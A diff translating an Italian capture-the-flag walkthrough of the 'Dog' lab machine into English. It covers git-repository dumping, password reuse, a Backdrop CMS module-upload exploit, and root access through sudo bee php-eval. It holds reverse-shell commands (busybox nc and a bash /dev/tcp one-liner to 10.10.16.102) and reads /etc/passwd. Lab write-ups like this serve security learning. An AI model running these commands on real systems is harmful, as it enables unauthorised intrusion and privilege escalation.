@@ -1,117 +1,117 @@
 # 🐶 Dog CTF - Walkthrough
 
-## 🔍 Ricognizione
+## 🔍 Initial Reconnaissance
 
-Ho iniziato con una scansione **Nmap** per individuare le porte aperte e i servizi attivi sulla macchina target.
+I started with an **Nmap** scan to identify open ports and active services on the target machine.
 
 ```bash
 nmap -sC -sV -A 10.10.11.58
 ```
 
-I risultati hanno mostrato due porte aperte:
+The results showed two open ports:
 
-- **Porta 22** → SSH
-- **Porta 80** → HTTP
+- **Port 22** → SSH
+- **Port 80** → HTTP
 
-Durante la scansione, ho notato la presenza di una cartella `.git`, il che suggerisce che il sito web potrebbe avere un repository Git accessibile.
+During the scan, I noticed the presence of a `.git` folder, which suggested that the website might have an accessible Git repository.
 
-## 📂 Recupero del Repository Git
+## 📂 Git Repository Recovery
 
-Utilizzando `git-dump`, ho scaricato il contenuto del repository presente nella cartella `.git`.
+Using `git-dump`, I downloaded the content of the repository present in the `.git` folder.
 
-All'interno del repository, ho individuato un file `settings.php`, che contiene una **password**.
+Inside the repository, I found a `settings.php` file, which contained a **password**.
 
-## 🔎 Identificazione di un Utente
+## 🔎 User Identification
 
-Dopo aver trovato la password, ho cercato un possibile username. Esplorando il sito sulla porta 80, ho individuato un nome utente, ma non era associato alla password trovata.
+After finding the password, I looked for a possible username. Exploring the website on port 80, I identified a username, but it was not associated with the password I found.
 
-Ho notato che le email degli utenti seguivano il formato `@dog.htb`, quindi ho eseguito una ricerca mirata all'interno del repository Git:
+I noticed that user emails followed the format `@dog.htb`, so I performed a targeted search within the Git repository:
 
 ```bash
 grep "@dog.htb" -r .
 ```
 
-Questa ricerca ha rivelato l'utente **tiffany**. Ho provato ad accedere con la password trovata in `settings.php` e sono riuscito a entrare nel sistema.
+This search revealed the user **tiffany**. I tried to log in with the password found in `settings.php` and successfully gained access to the system.
 
-## 🔥 Exploit per Backdrop CMS
+## 🔥 Exploit for Backdrop CMS
 
-Dopo ulteriori analisi, ho scoperto che il sito web utilizzava **Backdrop CMS**, e ho trovato un exploit disponibile su **Exploit-DB**:
+After further analysis, I discovered that the website was using **Backdrop CMS**, and I found an exploit available on **Exploit-DB**:
 
 🔗 [Backdrop CMS Exploit](https://www.exploit-db.com/exploits/52021)
 
-Questo exploit consente di creare un modulo personalizzato che permette l'esecuzione di codice arbitrario.
+This exploit allows you to create a custom module that enables arbitrary code execution.
 
-Per creare il modulo ho utilizzato due file:
+To create the module, I used two files:
 
 - `shell.info`
 - `shell.php`
 
-Questi file sono stati compressi in un archivio `.tar.gz` e caricati nel CMS.
+These files were compressed into a `.tar.gz` archive and uploaded to the CMS.
 
-Dopo l'installazione del modulo, ho navigato nella sezione **modules** ed eseguito `shell.php`, ottenendo l'esecuzione di comandi bash sul server.
+After installing the module, I navigated to the **modules** section and executed `shell.php`, obtaining bash command execution on the server.
 
-## 🐚 Ottenere una Shell
+## 🐚 Getting a Shell
 
-Per stabilire una **reverse shell**, ho avviato un listener sulla mia macchina:
+To establish a **reverse shell**, I started a listener on my machine:
 
 ```bash
 nc -lvnp 4444
 ```
 
-E poi, dal server target, ho eseguito:
+And then, from the target server, I executed:
 
 ```bash
 busybox nc 10.10.16.102 4444 -e sh
 ```
 
-Una volta dentro la macchina, ho migliorato l'interattività della shell con:
+Once inside the machine, I improved the shell's interactivity with:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Ho quindi cercato gli utenti presenti nel sistema:
+I then looked for users present in the system:
 
 ```bash
 cat /etc/passwd
 ```
 
-Ho individuato due utenti con una shell attiva, tra cui **johncusack**. Ho provato ad accedere tramite **SSH**:
+I identified two users with an active shell, including **johncusack**. I tried to access via **SSH**:
 
 ```bash
 ssh johncusack@10.10.11.58
 ```
 
-Usando la password trovata in `settings.php`, sono riuscito ad accedere all'utente **johncusack** e recuperare la **flag user.txt**.
+Using the password found in `settings.php`, I was able to access the user **johncusack** and retrieve the **user.txt flag**.
 
 ## 🚀 Privilege Escalation
 
-Per verificare i permessi di **sudo**, ho eseguito:
+To check **sudo** permissions, I executed:
 
 ```bash
 sudo -l
 ```
 
-Ho scoperto che l'utente **john** poteva eseguire il comando `bee`, che permette di eseguire **PHP** con privilegi elevati.
+I discovered that the user **john** could execute the `bee` command, which allows **PHP** to be executed with elevated privileges.
 
-Dopo alcune ricerche, ho scoperto che `bee` necessitava del percorso di **Backdrop CMS**, che si trovava in `/var/www/html`.
+After some research, I found that `bee` needed the path to **Backdrop CMS**, which was located at `/var/www/html`.
 
-A questo punto, ho eseguito dall'interno del percorso precedentemente trovato:
+At this point, I executed from within the previously found path:
 
 ```bash
 sudo bee php-eval 'echo(exec("cat /root/root.txt"))'
 ```
 
-E ho ottenuto la **flag root.txt**! 🏆
+And I obtained the **root.txt flag**! 🏆
 
-### 🔄 Alternativa: Reverse Shell con Privilegi di Root
+### 🔄 Alternative: Reverse Shell with Root Privileges
 
-Un'alternativa per ottenere una shell con privilegi di root sarebbe stata eseguire:
+An alternative to obtaining a root shell would have been to execute:
 
 ```bash
 sudo bee php-eval 'system("bash -c 'bash -i >& /dev/tcp/10.10.16.102/4444 0>&1'")'
 ```
 
-## 🎯 Conclusione
+## 🎯 Conclusion
 
-Questa macchina è stata un'ottima sfida che ha richiesto un mix di tecniche di **enumerazione**, **exploit di Backdrop CMS**, **reverse shell**, e **privilege escalation** con `bee`. 🚀
+This machine was an excellent challenge that required a mix of **enumeration techniques**, **Backdrop CMS exploit**, **reverse shell**, and **privilege escalation** with `bee`. 🚀
